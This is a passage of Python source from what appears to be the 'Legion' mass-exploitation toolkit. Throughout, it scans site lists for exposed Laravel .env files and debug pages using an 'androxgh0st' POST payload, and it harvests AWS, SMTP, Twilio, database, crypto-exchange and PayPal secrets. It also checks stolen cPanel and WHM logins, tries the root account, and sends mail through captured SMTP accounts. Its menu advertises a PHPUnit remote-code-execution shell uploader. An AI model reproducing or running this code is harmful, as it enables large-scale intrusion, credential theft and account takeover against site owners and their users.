                    if 'APP_KEY=' in str(get_source2):
                        get_aws(nurl + '/.env', str(get_source2))
                        get_ssh(nurl + '/.env', str(get_source2))
                        get_smtp(nurl + '/.env', str(get_source2))
                        get_smtp2(nurl + '/.env', str(get_source2))
                        get_nexmo(nurl + '/.env', str(get_source2))
                        get_twilio5(nurl + '/.env', str(get_source2))
                        get_twillio(nurl + '/.env', str(get_source2))
                        get_twillio3(nurl + '/.env', str(get_source2))
                        get_plivo(nurl + '/.env', str(get_source2))
                        get_onesignal(nurl + '/.env', str(get_source2))
                        get_twilio6(nurl + '/.env', str(get_source2))
                        get_database(nurl + '/.env', str(get_source2))
                        get_bain(nurl + '/.env', str(get_source2))
                        get_clicktell(nurl + '/.env', str(get_source2))
                        get_razo(nurl + '/.env', str(get_source2))
                        get_razo2(nurl + '/.env', str(get_source2))
                        get_mysql(nurl + '/.env', str(get_source2))






                    else:
                        get_source4 = requests.post(nurl, data={'0x[]': 'androxgh0st'}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
                        if '<td>APP_KEY</td>' in get_source4:
                            get_aws(nurl, get_source4)
                            get_ssh(nurl, get_source4)
                            get_smtp(nurl, get_source4)
                            get_smtp2(nurl, get_source4)
                            get_nexmo(nurl, get_source4)
                            get_twilio5(nurl, get_source4)
                            get_twillio(nurl, get_source4)
                            get_twillio3(nurl, get_source4)
                            get_plivo(nurl, get_source4)
                            get_onesignal(nurl, get_source4)
                            get_twilio6(nurl, get_source4)
                            get_database(nurl, get_source4)
                            get_bain(nurl, get_source4)
                            get_clicktell(nurl, get_source4)
                            get_razo(nurl, get_source4)
                            get_razo2(nurl, get_source4)
                            get_mysql(nurl, get_source4)









                        else:
                            print(''+ url + ': \033[33m[MY LEGION]\033[31m | \033[31mNOT VULN \033[36mWHIT HTTPS\033[0m\n')
                else:
                    print(''+ url + ': \033[33m[MY LEGION]\033[31m | \033[31mNOT VULN\033[0m\n')


    except Exception as e:
        pass
def di_BTCold(url):
    try:
        text = '\x1b[32;1m#\x1b[0m' + url
        headers = {'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get((url + '/.env'), headers=headers, timeout=5, verify=False, allow_redirects=False).text
        exp = '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        if 'APP_KEY=' in str(get_source):
            get_cpanel(url + '/.env', str(get_source))
            get_cpanel2(url + '/.env', str(get_source))
            binance1(url + '/.env', str(get_source))
            bittrex1(url + '/.env', str(get_source))
            bittrex(url + '/.env', str(get_source))
            poloniex(url + '/.env', str(get_source))
            hitbtc(url + '/.env', str(get_source))
            kraken(url + '/.env', str(get_source))
            binance(url + '/.env', str(get_source))
            coinpayments2(url + '/.env', str(get_source))
            coinpayments1(url + '/.env', str(get_source))
            coinpayments(url + '/.env', str(get_source))
            coinbase1(url + '/.env', str(get_source))
            deribit(url + '/.env', str(get_source))
            coinbase(url + '/.env', str(get_source))
            paypal(url + '/.env', str(get_source))






        else:
            get_source3 = requests.post(url, data={'0x[]': 'androxgh0st'}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
            if '<td>APP_KEY</td>' in get_source3:
                get_cpanel(url, get_source3)
                get_cpanel2(url, get_source3)
                binance1(url, get_source3)
                bittrex1(url, get_source3)
                bittrex(url, get_source3)
                poloniex(url, get_source3)
                hitbtc(url, get_source3)
                kraken(url, get_source3)
                binance(url, get_source3)
                coinpayments2(url, get_source3)
                coinpayments1(url, get_source3)
                coinpayments(url, get_source3)
                coinbase1(url, get_source3)
                deribit(url, get_source3)
                coinbase(url, get_source3)
                paypal(url, get_source3)








            else:
                if 'https' not in url and 'APP_KEY=' not in str(get_source):
                    nurl = url.replace('http', 'https')
                    get_source2 = requests.get((nurl + '/.env'), headers=headers, timeout=5, verify=False, allow_redirects=False).text
                    if 'APP_KEY=' in str(get_source2):
                        get_cpanel(nurl + '/.env', str(get_source2))
                        get_cpanel2(nurl + '/.env', str(get_source2))
                        binance1(nurl + '/.env', str(get_source2))
                        bittrex1(nurl + '/.env', str(get_source2))
                        bittrex(nurl + '/.env', str(get_source2))
                        poloniex(nurl + '/.env', str(get_source2))
                        hitbtc(nurl + '/.env', str(get_source2))
                        kraken(nurl + '/.env', str(get_source2))
                        binance(nurl + '/.env', str(get_source2))
                        coinpayments2(nurl + '/.env', str(get_source2))
                        coinpayments1(nurl + '/.env', str(get_source2))
                        coinpayments(nurl + '/.env', str(get_source2))
                        coinbase1(nurl + '/.env', str(get_source2))
                        deribit(nurl + '/.env', str(get_source2))
                        coinbase(nurl + '/.env', str(get_source2))
                        paypal(nurl + '/.env', str(get_source2))





                    else:
                        get_source4 = requests.post(nurl, data={'0x[]': 'androxgh0st'}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
                        if '<td>APP_KEY</td>' in get_source4:
                            get_cpanel(nurl, get_source4)
                            get_cpanel2(nurl, get_source4)
                            binance1(nurl, get_source4)
                            bittrex1(nurl, get_source4)
                            bittrex(nurl, get_source4)
                            poloniex(nurl, get_source4)
                            hitbtc(nurl, get_source4)
                            kraken(nurl, get_source4)
                            binance(nurl, get_source4)
                            coinpayments2(nurl, get_source4)
                            coinpayments1(nurl, get_source4)
                            coinpayments(nurl, get_source4)
                            coinbase1(nurl, get_source4)
                            deribit(nurl, get_source4)
                            coinbase(nurl, get_source4)
                            paypal(nurl, get_source4)








                        else:
                            print(''+ url + ': \033[33m[MY LEGION]\033[31m | \033[31mNOT VULN \033[36mWHIT HTTPS\033[0m\n')
                else:
                    print(''+ url + ': \033[33m[MY LEGION]\033[31m | \033[31mNOT VULN\033[0m\n')


    except Exception as e:
        pass

def jembotngw2old(sites):
    if 'http' not in sites:
        site = 'http://' + sites
        #di_chckngntdold(site)
        legalegion(site)
        wordpressCMDold(site)
        #di_BTCold(site)
    else:
        #di_chckngntdold(sites)
        legalegion(site)
        wordpressCMDold(site)
        #di_BTCold(site)
def makethread2old(jumlah):
    try:
        nam = input("\033[32m Input Your List|\033[31mMyLegion\033[32m$\033[0m ")
        th = int(jumlah)
        time.sleep(3)
        liss = [i.strip() for i in open(nam, 'r').readlines()]
        zm = Pool(th)
        zm.map(jembotngw2old, liss)
    except Exception as e:
        try:
            pass
        finally:
            e = None
            del e
def wordpressCMDold(url) :
    try :
        dom = domain(url)
        url = URLdomain(url)

        try:
            socket.gethostbyname(dom)
        except:
            print (' \033[31m[x] \033[33m' + url + ' \033[0m===> {}[Siteu Esta nu merge!]'.format(fr))
            return
        envold(url, dom)
    except:
        pass

#CPANELS
def cpanel(host, user, pswd):
    try:
        s = requests.Session()
        data = {"user":user,"pass":pswd}
        text = s.post("https://"+host+":2083/login", data=data, verify=False, allow_redirects=False, timeout=3).text
        if "URL=/cpses" in text:
            print(f"{fc}[{gr}VALID{fc}] {res}{host}{gr}|{res}{user}{gr}|{res}{pswd}")
            fopen = open("Results/!Cpanelz2.txt","a")
            fopen.write("https://"+host+":2083|"+user+"|"+pswd+"\n")
            fopen.close()
        else:
            print(f"{fc}[{red}BAD{fc}] {res}{host}{red}|{res}{user}{red}|{res}{pswd}")
        s.close()
    except KeyboardInterrupt:
        print("Closed")
        exit()
    except:
        print(f"{fc}[{red}ERROR{fc}] {res}{host}{yl}|{res}{user}{yl}|{res}{pswd}")
def bagian(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = prepare[3]
        password = prepare[4]
        cpanel(host, user, password)
        if "_" in prepare[3]:
            userr = prepare[3].split("_")[0]
            ppp = str(userr)
            cpanel(host, ppp, password)
    except:
        pass
    pass
#WHM
def whm(host, user, pswd):
    try:
        headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}
        s = requests.Session()
        data = {"user":user,"pass":pswd}
        text = s.post("https://"+host+":2087/login", data=data, headers=headers, verify=False, allow_redirects=False, timeout=15).text
        if "URL=/cpses" in text:
            print(f"{fc}[{gr}VALID{fc}] {res}{host}{gr}|{res}{user}{gr}|{res}{pswd}")
            fopen = open("Results/!Valid_whm.txt","a")
            fopen.write(host+"|"+user+"|"+pswd+"\n")
            fopen.close()
        else:
            print(f"{fc}[{red}BAD{fc}] {res}{host}{red}|{res}{user}{red}|{res}{pswd}")
            fopen = open("Results/DIE.txt","a")
            fopen.write(host+"|"+user+"|"+pswd+"\n")
            fopen.close()
        s.close()
    except KeyboardInterrupt:
        print("Closed")
        exit()
    except Exception as eror:
        print(f"{fc}[{red}ERROR{fc}] {res}{host}{yl}|{res}{user}{yl}|{res}{pswd}")
        fopen = open("Results/Error.txt","a")
        fopen.write(host+"|"+user+"|"+pswd+"\n")
        fopen.close()
def bagian2(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = 'root'
        password = prepare[4]
        whm(host, user, password)
    except:
        pass
    pass
#####################################
def Legionip(ip):
    try:
        ip = ip.replace('\n', '').replace('\r', '')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((ip, 80))
        if str(result) != '0':
            print ('\033[0m[\033[31m-\033[0m] \033[31mBad Ip \033[33m==> \033[31m' + ip)
            open('Checker/Badip.txt', 'a').write(ip + '\n')
        if str(result) == '0':
            print ('\033[0m[\033[32m+\033[0m] \033[32mGood Ip \033[33m==> \033[36m' + ip)
            open('Checker/Goodip.txt', 'a').write(ip + '\n')
    except:
        pass
class bcolors:
    OK = '\033[92m'  # GREEN
    OK2 = '\033[96m'
    WARNING = '\033[93m'  # YELLOW
    FAIL = '\033[91m'  # RED
    RESET = '\033[0m'  # RESET COLOR
    CYAN = '\033[36m'  # RESET COLOR
    banner = """
	UPDATE V1.5
    """
VALIDS = 0
INVALIDS = 0
def tester(smtp):
    HOST, PORT, usr, pas = smtp.strip().split('|')
    global VALIDS, INVALIDS
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        receiver_email = emailnow
        letter = str(fsetting2)
        msg = MIMEMultipart()
        msg['Subject'] = "Legion SMTP Tester"
        msg['From'] = usr
        msg['To'] = receiver_email
        msg.add_header('Content-Type', 'text/html')
        data = letter
        data2 = """
        <p>HOST,""" + HOST + """</p>
        <p>PORT,""" + PORT + """</p>
        <p>USER,""" + usr + """</p>
        <p>PASS,""" + pas + """</p>
        """
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        msg.attach(MIMEText(data2, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print(bcolors.OK + '   [WORKING] '+ bcolors.CYAN + '--> ' + bcolors.OK2 +'{}'.format(smtp))
        open("Smtp_Tester/Success_SMTP.txt", "a").write(str(smtp)+'\n')

        VALIDS += 1
    except:
        INVALIDS += 1
        print(bcolors.FAIL + '   [BAD] '+ bcolors.WARNING + '--> ' + bcolors.RESET + '{}'.format(smtp))
        open("Smtp_Tester/Failed_SMTP.txt", "a").write(str(smtp)+'\n')


# report
dot_env = 0
vuln = 0
not_vuln = 0
class Color:
    GREEN    = lambda x: "[bright_green]" + str(x) + "[/bright_green]"
    RED      = lambda x: "[bright_red]" + str(x) + "[/bright_red]"
    BLUE     = lambda x: "[bright_blue]" + str(x) + "[/bright_blue]"
    YELLOW   = lambda x: "[bright_yellow]" + str(x) + "[/bright_yellow]"
    MAGENTA  = lambda x: "[bright_magenta]" + str(x) + "[/bright_magenta]"
    CYAN     = lambda x: "[bright_cyan]" + str(x) + "[/bright_cyan]"
    WHITE    = lambda x: "[bright_white]" + str(x) + "[/bright_white]"

class LegionBot:

    PATH_ROOT = os.path.dirname(os.path.realpath(__file__))
    PATH_RESULT = os.path.join(PATH_ROOT, "Utility")


    SCRAPESTACK_KEY = cfg.get("SCRAPESTACK", "scrapestack_key")

    EMAIL_TEST = cfg.get("AWS", "email")


    # init Bot
    def __init__(self):

        self.show_info_message("Starting Legion Utility!")
        time.sleep(1)





        self.show_info_message(message="Loading Utility List....\n")
        time.sleep(1)

        print(f'''
{yl}[{red}1{yl}] {gr}Random IP Address Generator{fc} Custom Total
{yl}[{red}2{yl}] {gr}HTTP IP Address Checker With Port Scanner{fc} Port 80"
{yl}[{red}3{yl}] {gr}AWS API Key Generator{fc} Custom Total
{yl}[{red}4{yl}] {gr}Sendgrid API Key Generator{fc} Custom Total
{yl}[{red}6{yl}] {gr}Mass Reverse Domain to IP Address{fc} Convert Domain to IP Address
{yl}[{red}7{yl}] {gr}Mass CMS Scanner{fc} Filter Site List by CMS
{yl}[{red}8{yl}] {gr}Mass Subdomain Enumeration Scanner{fc} Unlimited Without Proxy
{yl}[{red}9{yl}] {gr}Mass PayPal Email Validator{fc} Check Live, Dead, Limited (Beta)
{yl}[{red}10{yl}] {gr}Mass Email Validator{fc} Check Deliverability
{yl}[{red}11{yl}] {gr}Mass Twilio Checker{fc} Format: TWILIO_ACCOUNT_SID|TWILIO_AUTH_TOKEN
{yl}[{red}12{yl}] {gr}Mass AWS Checker{fc} Get Limit, Create Console, Create SMTP, Get Identities
{yl}[{red}13{yl}] {gr}Mass AWS EC2 Checker{fc} Get EC2 VCPU Limit
{yl}[{red}14{yl}] {gr}Mass Sendgrid API Key Checker{fc} Format: APIKEY|SENDGRID PASS
{yl}[{red}15{yl}] {gr}Mass get Valid PhpMyAdmin Databses
{yl}[{red}16{yl}] {gr}Get {fc} [{red}Apache Laravel Framework{fc}]
        ''')
        list_desc = {

            "1": ["Random IP Address Generator", "Custom Total"],
            "2": ["Random IP Address Generator with IP Range", "192.168.0.0-192.168.255.255"],
            "3": ["HTTP IP Address Checker With Port Scanner", "Port 80"],
            "4": ["AWS API Key Generator", "Custom Total"],
            "5": ["Sendgrid API Key Generator", "Custom Total"],
            "6": ["Mass Laravel Validator", "Get Laravel Site List"],
            "7": ["Mass Laravel Database Scanner", "Get PHPMyAdmin or Adminer Login"],
            "8": ["Mass Laravel SMTP Scanner", "Auto Test Send"],
            "9": ["Mass Laravel Config Scanner", "Get Laravel Config"],
            "10": ["Mass Hidden Debug Results", "Get Missconfigure Config"],
            "11": ["Mass CMS Scanner", "Filter Site List by CMS"],
            "12": ["Mass PHPUnit RCE Exploiter", "Auto Upload Shell"],
            "13": ["Mass Reverse IP Scanner", "With Scrapestack API"],
            "14": ["Mass Reverse IP Scanner", "Unlimited Without Proxy"],
            "15": ["Mass Reverse Domain to IP Address", "Convert Domain to IP Address"],
            "16": ["Mass Subdomain Enumeration Scanner", "Unlimited Without Proxy"],
            "17": ["Mass PayPal Email Validator", "Check Live, Dead, Limited (Beta)"],
            "18": ["Mass Email Validator", "Check Deliverability"],
            "19": ["Mass Twilio Checker", "Format: TWILIO_ACCOUNT_SID|TWILIO_AUTH_TOKEN"],
            "20": ["Mass AWS Checker", "Get Limit, Create Console, Create SMTP, Get Identities"],
            "21": ["Mass AWS EC2 Checker", "Get EC2 VCPU Limit"],
            "22": ["Mass Sendgrid API Key Checker", "Check Limit, Check Used, Check Mail From"],
            "23": ["Exit Program", "Exit Bot"],

            }


        self.choice = self.prompt_ask(command="Enter Your Choice?", choices=[str(i) for i in range(1, len(list(list_desc)) + 1)], integer=True)

        if self.choice == len(list(list_desc)):

            self.show_info_message(message="Exiting Bot!")
            sys.exit(1)

        else:

            if self.choice == 1:
                self.input_list = self.prompt_ask(command="How Many IP Address?", integer=True)

            elif self.choice == 3:
                self.input_list = self.prompt_ask(command="How Many AWS Key?", integer=True)
                self.input_region = self.prompt_ask(command="AWS Region?", integer=False)

            elif self.choice == 4:
                self.input_list = self.prompt_ask(command="How Many Sendgrid Key?", integer=True)

            else:
                self.input_list = self.prompt_ask(command="Enter Target List?", integer=False)

            self.num_threads = self.prompt_ask(command="Threads?", integer=True)
            self.clean_file  = self.prompt_ask(command="Clean Result Folder?", choices=["y", "n"], integer=False)

        print("\n")
        self.show_info_message(message="Started!")

        if self.clean_file.strip().lower() == "y":
            self.clean_result_folder()

        if self.choice == 1:
            self.ip_address_generator(length=self.input_list)
        elif self.choice == 2:
            self.run_bot(
                bot_mode=self.http_port_scanner,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 3:
            self.aws_generator(
                length=self.input_list,
                region=self.input_region,
            )
        elif self.choice == 4:
            self.sendgrid_generator(length=self.input_list)
        elif self.choice == 5:
            self.run_bot(
                bot_mode=self.laravel_validator,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 6:
            self.run_bot(
                bot_mode=self.reverse_domain_to_ip,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 7:
            self.run_bot(
                bot_mode=self.cms_scanner,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 8:
            self.run_bot(
                bot_mode=self.subdomain_enumeration_scanner,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 9:
            self.run_bot(
                bot_mode=self.paypal_validator,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 10:
            self.run_bot(
                bot_mode=self.email_validator,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 11:
            self.run_bot(
                bot_mode=self.twilio_checker,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 12:
            self.run_bot(
                bot_mode=self.aws_checker,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 13:
            self.run_bot(
                bot_mode=self.ec_checker,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )

        elif self.choice == 14:
            self.run_bot(
                bot_mode=self.sendgrid_checker,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 15:
            self.run_bot(
                bot_mode=self.get_laravel_database,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 16:
            self.run_bot(
                bot_mode=self.credential_checker,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )


        elif self.choice == len(list(list_desc)) + 1:
            self.show_info_message("Exiting Bot!")
            sys.exit(1)
        else:
            self.show_error_message("Wrong Choice!")
            sys.exit(1)
    def prompt_ask(
        self,
        command = "Command Not Set",
        choices = False,
        integer = False
        ):

        if integer:
            if choices:
                retrive_command = IntPrompt.ask(f"{red}[{gr}{command}{red}] ")
            else:
                retrive_command = IntPrompt.ask(f"{red}[{gr}{command}{red}]")
        else:
            if choices:
                retrive_command = Prompt.ask(f"{red}[{gr}{command}{red}]")
            else:
                retrive_command = Prompt.ask(f"{red}[{gr}{command}{red}]")

        return retrive_command
    def clean_result_folder(self):
        try:
            result_files = [f for f in os.listdir(self.PATH_RESULT) if f.endswith(".txt")]
            for clean in result_files:
                self.show_info_message("Cleaning Result: %s" % clean)
                os.remove(os.path.join(self.PATH_RESULT, clean))
            print("\n")
        except:
            pass
    def show_error_message(self, message):
        print(f"{red}ERROR {yl}{message}")
    def show_warning_message(self, message):
        print(f"{yl}WARNING {res}{message}")
    def show_info_message(self, message):
        print(f"{red}Legion {gr}{message}")
    def clean_string(self, value):
        return value.replace("\n", "").replace("\r", "")
    def safe_string(self, value):
        return self.clean_string(value).rstrip().lstrip().strip()
    def map_helper(self, args, kwargs):
        return args(*kwargs)
    def write_file(self, path, value):
        with open(path, "a+") as save:
            save.seek(0, os.SEEK_END)
            if type(value) is list:
                for list_value in value:
                    save.write("%s\n" % list_value)
            elif type(value) is str:
                save.write("%s\n" % value)
        save.close()
    def url_format(self, url):
        parse_url = urlparse(url)
        if parse_url.scheme:
            target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
        else:
            target_url = "http://{}".format(url)

        return target_url
    def set_result(self, filename):
        return os.path.join(self.PATH_RESULT, filename)
    def set_property(self, dictionary):
        return NamedTuple("setProperty", dictionary.keys())(**dictionary)
    def join_string(self, str_value):
        return "".join([str(item) for item in str_value])
    def get_file(self, file):
        self.show_info_message("Filtering List : %s" % file)
        try:
            join_path   = os.path.join(self.PATH_ROOT, file)
            list_load   = open(join_path).read().splitlines()
            list_data   = list(numpy.unique(list_load))
            list_length = len(list(list_data))

            list_init = {"list": list_data, "length": list_length}

            return list_init
        except FileNotFoundError:
            self.show_error_message("%s Not Found" % join_path)
            sys.exit(1)

        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            pass
    def show_status_message(self, counter, length, data = "Data Empty", message = "Message Not Set", status = False, mode = "Default Mode"):

        if status:
            status_message = f"{fc}[{gr}✓{fc}]"
        else:
            status_message = f"{fc}[{red}✗{fc}]"

        #status_message += "[%s] " % Color.BLUE(time)
        status_message += f" {yl}[{gr}{counter}{fc}/{res}{length}{yl}] "

        if status:
            if type(message) is list:
                for message_list in message:
                    status_message += f"{gr}{message_list} "
            else:
                status_message += f"{gr}{message} "
        else:
            if type(message) is list:
                for message_list in message:
                    status_message += f"{red}{message_list} "
            else:
                status_message += f"{red}{message} "

        status_message += f"{res}{data} "

        status_message += f"{red}[{fc}{mode}{red}]"

        print(self.join_string(status_message))
    def ip_address_generator(self, length):
        self.show_info_message(
            message="Generating Total %s Of IP Address, Please Wait....." % length
        )

        start = time.time()
        generated_ip_address = self.set_result(filename="generated_ip_address.txt")
        list_map = []
        progress = Progress(
            "[progress.description]{task.description}",
            BarColumn(),
            "[magenta]{task.completed} of {task.total} IP Address Generated",
            TimeRemainingColumn(),
        )

        MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES
        with progress:
            task = progress.add_task("[%s] %s" % (Color.RED("Legion"), Color.GREEN("Generating IP Address...")), total=int(length))

            for key in range(int(length)):
                ip_address_value = ipaddress.IPv4Address._string_from_ip_int(
                    random.randint(1, MAX_IPV4)
                )
                list_map.append(ip_address_value)
                progress.update(task, advance=1)

        self.write_file(generated_ip_address, list_map)
        end = time.time()
        hours, rem = divmod(end - start, 3600)
        minutes, seconds = divmod(rem, 60)
        self.show_info_message(
            "Success, Time Elapsed: {:0>2}:{:0>2}:{:05.2f}".format(
                int(hours), int(minutes), seconds
            )
        )
        self.show_info_message("Result Saved At: %s" % generated_ip_address)
    def aws_generator(self, length, region):

        chars = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","/","/"]
        chars = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9"]

        def aws_id():
            output = "AKIA"
            for i in range(16):
                output += random.choice(chars[0:38]).upper()
            return output

        def aws_key():
            output = ""
            for i in range(40):

                if i == 0 or i == 39:
                    randUpper = random.choice(chars[0:38]).upper()
                    output += random.choice([randUpper, random.choice(chars[0:38])])
                else:
                    randUpper = random.choice(chars[0:38]).upper()
                    output += random.choice([randUpper, random.choice(chars)])

            return output

        self.show_info_message(message="Generating Total %s Of AWS Key, Please Wait....." % length)

        start = time.time()
        save_aws = self.set_result(filename="generated_aws.txt")
        list_map = []
        progress = Progress(
            "[progress.description]{task.description}",
            BarColumn(),
            "[magenta]{task.completed} of {task.total} AWS Key Generated",
            TimeRemainingColumn(),
        )

        with progress:
            task = progress.add_task("[%s] %s" % (Color.BLUE("INFO"), Color.WHITE("Generating AWS Key...")), total=int(length))

            for key in range(int(length)):

                aws_value = "%s|%s|%s" % (aws_id(), aws_key(), region)
                list_map.append(aws_value)
                progress.update(task, advance=1)

        self.write_file(save_aws, list_map)
        end = time.time()
        hours, rem = divmod(end - start, 3600)
        minutes, seconds = divmod(rem, 60)
        self.show_info_message(
            "Success, Time Elapsed: {:0>2}:{:0>2}:{:05.2f}".format(
                int(hours), int(minutes), seconds
            )
        )
        self.show_info_message("Result Saved At: %s" % save_aws)
    def sendgrid_generator(self, length):

        charsend = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","-","_"]

        def sendgrid_key():

            output = 'SG.'
            for i in range(22):
                ranUpper = random.choice(charsend[0:38]).upper()
                output += random.choice([ranUpper, random.choice(charsend[0:38])])
            output += '.'
            for i in range(43):
                ranUpper = random.choice(charsend[0:38]).upper()
                output += random.choice([ranUpper, random.choice(charsend[0:38])])

            return output


        self.show_info_message(
            message="Generating Total %s Of Sendgrid Key, Please Wait....." % length
        )

        start = time.time()
        save_sendgrid = self.set_result(filename="generated_sendgrid.txt")
        list_map = []
        progress = Progress(
            "[progress.description]{task.description}",
            BarColumn(),
            "[magenta]{task.completed} of {task.total} Sendgrid Key Generated",
            TimeRemainingColumn(),
        )

        with progress:
            task = progress.add_task("[%s] %s" % (Color.BLUE("INFO"), Color.WHITE("Generating Sendgrid Key...")), total=int(length))

            for key in range(int(length)):

                sendgrid_value = sendgrid_key()

                list_map.append(sendgrid_value)
                progress.update(task, advance=1)

        self.write_file(save_sendgrid, list_map)
        end = time.time()
        hours, rem = divmod(end - start, 3600)
        minutes, seconds = divmod(rem, 60)
        self.show_info_message(
            "Success, Time Elapsed: {:0>2}:{:0>2}:{:05.2f}".format(
                int(hours), int(minutes), seconds
            )
        )
        self.show_info_message("Result Saved At: %s" % save_sendgrid)
    def http_port_scanner(self, counter, length, ip_url):
        try:

            http_ip_address_live = self.set_result(filename="http_ip_address_live.txt")
            http_ip_address_dead = self.set_result(filename="http_ip_address_dead.txt")

            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            parse_url = urlparse(ip_url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(ip_url)
            try:
                ip = socket.gethostbyname(
                    target_url.replace("https://", "")
                    .replace("http://", "")
                    .replace("/", "")
                    .strip()
                )
                append_url = "http://%s" % ip
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Cache-Control": "max-age=0",
                    "TE": "Trailers",
                }
                response_url = requests.get(url=append_url, headers=headers, timeout=5, verify=False)

                if response_url.status_code < 600:

                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Open",
                        status=True,
                        mode="Port 80 Open",
                    )
                    self.write_file(http_ip_address_live, ip_url+':80')
                else:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Close",
                        status=False,
                        mode="Port 80 Closed",
                    )
                    self.write_file(http_ip_address_dead, ip_url+':80')

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Cannot Connect or Timeout!",
                    status=False,
                    mode="Port 80 Checker",
                )
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            pass
    def laravel_validator(self, counter, length, url):
        try:

            live_list = self.set_result("laravel_site_live.txt")
            dead_list = self.set_result("laravel_site_dead.txt")

            parse_url = urlparse(url)

            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(url)

            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "TE": "Trailers",
            }

            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:

                url_config = "/".join([target_url, ".env"])

                get_config = requests.get(
                    url=url_config,
                    headers=headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=False,
                )

                if "APP_KEY" in get_config.text:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Laravel",
                        status=True,
                        mode="Laravel Validator",
                    )
                    self.write_file(live_list, target_url)
                    #telegram_send.send(messages=[target_url,"Laravel Validator"])

                else:
                    get_config = requests.post(
                        url=target_url,
                        data={"0x[]": "x_X"},
                        headers=headers,
                        timeout=5,
                        verify=False,
                        allow_redirects=False,
                    )
                    if "<td>APP_KEY</td>" in get_config.text:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=target_url,
                            message="Laravel Debug",
                            status=True,
                            mode="Laravel Validator",
                        )
                        self.write_file(live_list, target_url)
                        #telegram_send.send(messages=[target_url])

                    else:

                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=target_url,
                            message="Not Laravel",
                            status=False,
                            mode="Laravel Validator",
                        )
                        #self.write_file(dead_list, target_url)

            except KeyboardInterrupt:
                raise KeyboardInterrupt
